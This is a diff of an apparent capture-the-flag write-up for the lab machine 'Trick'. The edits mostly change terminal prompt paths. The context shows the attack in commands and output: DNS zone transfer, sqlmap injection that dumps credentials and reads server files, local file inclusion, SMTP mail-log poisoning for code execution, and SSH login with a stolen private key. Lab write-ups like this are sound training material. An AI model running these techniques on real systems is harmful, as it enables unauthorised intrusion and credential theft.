@@ -22,7 +22,7 @@ difficulty: Easy
 I started with a full TCP scan 
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.227.180 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-01 08:11 CET
 Nmap scan report for 10.129.227.180
@@ -51,7 +51,7 @@ Nmap done: 1 IP address (1 host up) scanned in 316.62 seconds
 My next step was to enumerate the DNS server running on port 53, so I used `dig` to perform a reverse lookup.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $dig -x 10.129.227.180 @10.129.227.180 any 
 
 ; <<>> DiG 9.20.26-1~deb13u1-Debian <<>> -x 10.129.227.180 @10.129.227.180 any
@@ -87,7 +87,7 @@ trick.htb.		604800	IN	AAAA	::1
 I found `trick.htb` as the domain name from the reverse DNS lookup, so I added it to my `/etc/hosts` file.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $echo "10.129.227.180 trick.htb" | sudo tee -a /etc/hosts
 10.129.227.180 trick.htb
 ```
@@ -97,7 +97,7 @@ I found `trick.htb` as the domain name from the reverse DNS lookup, so I added i
 The page showed nothing special, so I moved to directory brute-forcing.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $ffuf -u http://10.129.227.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt 
 
         /'___\  /'___\           /'___\       
@@ -131,7 +131,7 @@ assets                  [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 1
 The results showed nothing of interest. I then performed DNS Zone Transfer attempt for `trick.htb` and discovered a subdomain: `preprod-payroll.trick.htb`. I added it to my `/etc/hosts` file. 
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $dig @10.129.227.180 trick.htb axfr
 
 ; <<>> DiG 9.20.26-1~deb13u1-Debian <<>> @10.129.227.180 trick.htb axfr
@@ -148,7 +148,7 @@ trick.htb.		604800	IN	SOA	trick.htb. root.trick.htb. 5 604800 86400 2419200 6048
 ;; WHEN: Tue Sep 01 11:02:49 CET 2026
 ;; XFR size: 6 records (messages 1, bytes 231)
 
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $echo "10.129.227.180 preprod-payroll.trick.htb." | sudo tee -a /etc/hosts 
 10.129.227.180 preprod-payroll.trick.htb.
 ```
@@ -168,7 +168,7 @@ We received an interesting error message:
 I copied the login request to a `login.req` file and used SQLMap to enumerate the database.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $cat login.req 
 POST /ajax.php?action=login HTTP/1.1
 Host: preprod-payroll.trick.htb
@@ -190,7 +190,7 @@ username=admin*&password=admin*
 ```
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $sqlmap -r login.req --level 5 --risk 3 --flush-session --batch 
 <SNIP>
 sqlmap identified the following injection point(s) with a total of 606 HTTP(s) requests:
@@ -231,7 +231,7 @@ Table: users
 I tested the credentials on both SSH and the web application. The admin dashboard displayed nothing useful, and the SSH login failed. I then checked the database user privileges to understand what operations were available.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $sqlmap -r login.req --level 5 --risk 3 --privileges
 <SNIP>
 [11:33:51] [INFO] the back-end DBMS is MySQL
@@ -253,7 +253,7 @@ database management system users privileges:
 The database user had the `FILE` privilege, which means I could read and write files on the server. I attempted to read the Nginx configuration file to identify the web root directories.
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $cat /home/tr3m0x/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_etc_nginx_sites-available_default
 server {
 	listen 80 default_server;
@@ -317,7 +317,7 @@ server {
 I attempted to upload a PHP reverse shell to the three root directories, but the file write operations failed. However, I noticed another vhost in the configuration: `preprod-marketing.trick.htb`. I added it to my `/etc/hosts` and read the `/var/www/market/index.php` file: 
 
 ```bash
-┌─[✗]─[tr3m0x@parrot]─[~]
+┌─[✗]─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $cat /home/tr3m0x/.local/share/sqlmap/output/preprod-payroll.trick.htb/files/_var_www_market_index.php
 <?php
 $file = $_GET['page'];
@@ -350,7 +350,7 @@ However, I remembered the SMTP port from the initial Nmap scan. If I send an ema
 I connected to the SMTP server and sent an email with PHP code:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $nc trick.htb 25
 helo test
 220 debian.localdomain ESMTP Postfix (Debian/GNU)
@@ -372,7 +372,9 @@ I then accessed the email file through the LFI vulnerability:
 
 Perfect! I had code execution. Now I needed to upgrade this to a proper shell.
 
-## Shell as Michael
+## Initial Foothold
+
+### Shell as `michael`
 
 ### Method 1: LFI + PHP Reverse Shell (The Harder Way)
 
@@ -409,7 +411,7 @@ Using the LFI vulnerability, I accessed the private key:
 I then saved the private key to my local machine and set the proper permissions before using it to SSH as Michael:
 
 ```bash
-┌─[tr3m0x@parrot]─[~]
+┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $chmod 600 michael.id_rsa
 ┌─[tr3m0x@parrot]─[~/htb/linux/Trick]
 └──╼ $ssh michael@trick.htb -i michael.id_rsa
